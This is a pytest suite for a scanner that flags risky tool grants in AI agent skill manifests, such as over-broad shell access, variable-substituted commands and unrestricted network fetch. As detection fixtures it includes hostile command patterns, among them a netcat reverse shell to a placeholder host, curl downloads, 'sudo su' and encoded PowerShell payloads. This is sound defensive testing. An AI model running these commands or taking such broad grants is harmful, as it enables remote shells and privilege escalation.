"""Contract tests for execution/network pre-grants (SXV-003/004)."""

from __future__ import annotations

import pytest

from skill_xray import ingest, parse
from skill_xray.checks import run_checks


def _manifest(*lines):
    return "---\nname: demo\n%s\n---\nbody\n" % "\n".join(lines)


def _run(make_package, manifest):
    package = ingest.build_package(str(make_package({"SKILL.md": manifest})))
    parsed = parse.parse_package(package)
    return [f for f in run_checks(parsed) if f.vector in {"SXV-003", "SXV-004"}]


@pytest.mark.parametrize(("specifier", "variable"), [
    ("Bash($TOOL/run.sh)", "$TOOL"),
    ("Bash(${BIN} deploy)", "${BIN}"),
    ("Shell($RUNNER/task.cmd)", "$RUNNER"),
    ("Bash(%USERPROFILE%\\tool.exe)", "%USERPROFILE%"),
    ("Bash($env:USERPROFILE\\tool.ps1)", "$env:USERPROFILE"),
    ("Bash($Env:APPDATA\\tool.ps1)", "$Env:APPDATA"),
    ("Bash($(command -v python) task.py)", "$(command -v python)"),
    ("Bash(`command -v python` task.py)", "`command -v python`"),
    ("Bash(${RUNNER:-python} task.py)", "${RUNNER:-python}"),
    ("Bash($1 task.py)", "$1"),
    ("Bash(echo ok && $RUNNER payload)", "$RUNNER"),
    ("Bash(sudo $RUNNER payload:*)", "$RUNNER"),
])
def test_dynamic_execution_head_reports_sxv003(make_package, specifier, variable):
    findings = _run(make_package, _manifest("allowed-tools: %s" % specifier))
    finding = next(f for f in findings if f.vector == "SXV-003")

    assert (finding.rule, finding.severity, finding.path, finding.line) == (
        "grant-variable-substitution", "high", "SKILL.md", 3)
    assert finding.evidence == {
        "grant_text": specifier, "variable_name": variable, "line": 3,
    }


@pytest.mark.parametrize("specifier", [
    "Bash(echo $HOME:*)",
    "Bash(CONFIG=$SKILL_DIR/config node build.js:*)",
    "Read($HOME/notes.md)",
    "Bash(echo %PATH%:*)",
    "Bash(echo $env:PATH:*)",
])
def test_argument_or_non_execution_variables_do_not_report_sxv003(make_package, specifier):
    findings = _run(make_package, _manifest("allowed-tools: %s" % specifier))
    assert all(f.vector != "SXV-003" for f in findings)


@pytest.mark.parametrize(("specifier", "breadth", "severity"), [
    ("Bash", "wildcard_all_commands", "critical"),
    ("Bash(*)", "wildcard_all_commands", "critical"),
    ("Bash(:*)", "wildcard_all_commands", "critical"),
    ("Bash(curl:*)", "interpreter_or_downloader", "high"),
    ("Bash(python -u -c:*)", "interpreter_or_downloader", "high"),
    ("Bash(C:\\\\tools\\\\curl.exe:*)", "interpreter_or_downloader", "high"),
    ("Bash(C:\\\\tools\\\\curl.exe)", "interpreter_or_downloader", "high"),
    ("Bash(pip install requests)", "package_installer", "high"),
    ("Bash(sudo python -c:*)", "privilege_escalation", "critical"),
    ("Bash(curl -fsSL https://example.invalid/x:*)", "interpreter_or_downloader", "high"),
    ("Bash(nc -e /bin/sh host 4444:*)", "interpreter_or_downloader", "high"),
    ("Bash(echo ok && sudo su:*)", "privilege_escalation", "critical"),
    ('Bash("curl" -fsSL https://example.invalid/x:*)',
     "interpreter_or_downloader", "high"),
    ("Bash(cmd.exe /c whoami:*)", "interpreter_or_downloader", "high"),
])
def test_broad_execution_grants_report_sxv004(
    make_package, specifier, breadth, severity,
):
    findings = _run(make_package, _manifest("allowed-tools: %s" % specifier))
    finding = next(f for f in findings if f.vector == "SXV-004")

    assert (finding.rule, finding.severity, finding.path, finding.line) == (
        "grant-over-broad", severity, "SKILL.md", 3)
    assert finding.evidence["grant_text"] == specifier
    assert finding.evidence["breadth_class"] == breadth


@pytest.mark.parametrize(("specifier", "reaches_network"), [
    ("Bash(curl:*)", True),
    ("Bash(*)", True),
    ("Bash(python -c:*)", True),
    ("Bash(eval:*)", False),
])
def test_network_reachability_is_explicit_evidence(
    make_package, specifier, reaches_network,
):
    findings = _run(make_package, _manifest("allowed-tools: %s" % specifier))
    finding = next(f for f in findings if f.vector == "SXV-004")
    assert finding.evidence["reaches_network"] is reaches_network


@pytest.mark.parametrize("specifier", [
    "Bash(scripts/run.sh:*)",
    "Bash(python app.py)",
    "Bash(git log:*)",
    "Read",
    "Grep",
    "WebFetch(domain:example.com)",
])
def test_narrow_or_non_execution_grants_are_not_reported(make_package, specifier):
    assert _run(make_package, _manifest("allowed-tools: %s" % specifier)) == []


def test_package_local_chmod_is_not_privilege_escalation(make_package):
    assert _run(
        make_package, _manifest("allowed-tools: Bash(chmod +x scripts/setup.sh:*)"),
    ) == []


def test_later_network_segment_sets_network_evidence(make_package):
    findings = _run(
        make_package,
        _manifest("allowed-tools: Bash(echo ok && curl https://example.invalid:*)"),
    )
    hit = next(finding for finding in findings if finding.vector == "SXV-004")
    assert hit.evidence["reaches_network"] is True


def test_disallowed_grant_is_never_treated_as_risk(make_package):
    manifest = _manifest(
        "allowed-tools: Bash(scripts/run.sh:*)",
        "disallowed-tools: Bash(curl:*)",
    )
    assert _run(make_package, manifest) == []


@pytest.mark.parametrize("specifier", ["WebFetch", "WebSearch"])
def test_unrestricted_network_grant_reports_capability_risk(make_package, specifier):
    findings = _run(make_package, _manifest("allowed-tools: %s" % specifier))

    assert len(findings) == 1
    finding = findings[0]
    assert (finding.vector, finding.severity) == ("SXV-004", "high")
    assert finding.evidence["breadth_class"] == "unrestricted_network"
    assert finding.evidence["reaches_network"] is True


@pytest.mark.parametrize("specifier", [
    "WebFetch(*)", "WebFetch(**)", "WebFetch(:*)", "WebFetch(domain:*)",
    "WebSearch(*)", "WebSearch(**)", "WebSearch(:*)",
])
def test_network_wildcards_are_unrestricted(make_package, specifier):
    findings = _run(make_package, _manifest("allowed-tools: %s" % specifier))
    assert len(findings) == 1
    assert findings[0].evidence["breadth_class"] == "unrestricted_network"


@pytest.mark.parametrize("specifier", [
    "Bash(python -m pytest:*)",
    "Bash(python3 -m http.server:*)",
    "Bash(python -m json.tool:*)",
])
def test_fixed_python_modules_are_not_misclassified_as_installers(make_package, specifier):
    assert _run(make_package, _manifest("allowed-tools: %s" % specifier)) == []


@pytest.mark.parametrize("specifier", [
    "Bash(python -m pip install requests:*)",
    "Bash(python3 -m ensurepip:*)",
])
def test_python_installer_modules_are_package_installers(make_package, specifier):
    findings = _run(make_package, _manifest("allowed-tools: %s" % specifier))
    assert findings[0].evidence["breadth_class"] == "package_installer"


@pytest.mark.parametrize("specifier", [
    "Bash(env -u TOKEN curl:*)",
    "Bash(timeout --signal KILL 5 curl:*)",
])
def test_wrapper_option_values_do_not_hide_broad_commands(make_package, specifier):
    findings = _run(make_package, _manifest("allowed-tools: %s" % specifier))
    assert findings[0].evidence["breadth_class"] == "interpreter_or_downloader"


def test_wrapper_around_narrow_local_script_stays_narrow(make_package):
    findings = _run(
        make_package, _manifest("allowed-tools: Bash(timeout 5 scripts/run.sh:*)"),
    )
    assert findings == []


def test_disallowed_grant_does_not_mask_allowed_risk(make_package):
    manifest = _manifest(
        "allowed-tools: Bash(sudo:*)",
        "disallowed-tools: Bash(curl:*)",
    )
    findings = _run(make_package, manifest)
    assert [(f.vector, f.evidence["breadth_class"]) for f in findings] == [
        ("SXV-004", "privilege_escalation")
    ]


def test_dynamic_downloader_path_can_report_both_risks(make_package):
    findings = _run(
        make_package, _manifest("allowed-tools: Bash($TOOLS/curl:*)"),
    )
    assert {f.vector for f in findings} == {"SXV-003", "SXV-004"}


def test_non_manifest_grants_are_out_of_scope(make_package):
    package = ingest.build_package(str(make_package({
        "SKILL.md": _manifest("allowed-tools: Read"),
        "guide.md": _manifest("allowed-tools: Bash(curl:*)"),
    })))
    findings = run_checks(parse.parse_package(package))
    assert not [f for f in findings if f.vector in {"SXV-003", "SXV-004"}]


def test_malformed_allowed_tools_remains_visible_as_incomplete_analysis(make_package):
    package = ingest.build_package(str(make_package({
        "SKILL.md": _manifest("allowed-tools: [Read, {Bash: true}]"),
    })))
    findings = run_checks(parse.parse_package(package))

    assert not [f for f in findings if f.vector in {"SXV-003", "SXV-004"}]
    assert any(
        f.rule == "coverage-note"
        and f.evidence.get("reason") == "grants_unparsed_shape"
        for f in findings
    )


@pytest.mark.parametrize("specifier", ["Bash(curl:*", 'Bash("curl:*)'])
def test_malformed_scalar_grant_is_visible_and_does_not_disable_siblings(
    make_package, specifier,
):
    package = ingest.build_package(str(make_package({
        "SKILL.md": _manifest(
            "allowed-tools: [%s, Bash(sudo:*)]" % specifier,
        ),
    })))
    parsed = parse.parse_package(package)
    findings = run_checks(parsed)

    assert any(f.vector == "SXV-004" and f.evidence["breadth_class"] ==
               "privilege_escalation" for f in findings)
    assert any(
        f.rule == "coverage-note"
        and f.evidence.get("reason") == "grants_unparsed_shape"
        for f in findings
    )


@pytest.mark.parametrize(("specifier", "variable"), [
    ('Bash(sh -c "$RUNNER")', "$RUNNER"),
    ("Bash(cmd /c %COMSPEC%)", "%COMSPEC%"),
    ("Bash(powershell -Command $PAYLOAD)", "$PAYLOAD"),
    ("Bash(pwsh -EncodedCommand $ENCODED)", "$ENCODED"),
])
def test_dynamic_interpreter_payload_reports_sxv003(make_package, specifier, variable):
    findings = _run(make_package, _manifest("allowed-tools: %s" % specifier))
    hit = next(f for f in findings if f.vector == "SXV-003")
    assert hit.evidence["variable_name"] == variable


def test_aria2c_grant_is_broad_and_network_capable(make_package):
    findings = _run(make_package, _manifest("allowed-tools: Bash(aria2c:*)"))
    hit = next(f for f in findings if f.vector == "SXV-004")
    assert hit.evidence["breadth_class"] == "interpreter_or_downloader"
    assert hit.evidence["reaches_network"] is True


def test_grant_findings_are_capped_with_visible_note(make_package):
    # Bare custom commands are narrow, so use distinct dynamic executable heads.
    grants = ", ".join("Bash($TOOL%d/run)" % index for index in range(28))
    package = ingest.build_package(str(make_package({
        "SKILL.md": _manifest("allowed-tools: [%s]" % grants),
    })))
    findings = run_checks(parse.parse_package(package))

    assert len([f for f in findings if f.vector == "SXV-003"]) == 25
    assert any(
        f.rule == "findings-capped" and "3 more SXV-003 findings" in f.message
        for f in findings
    )
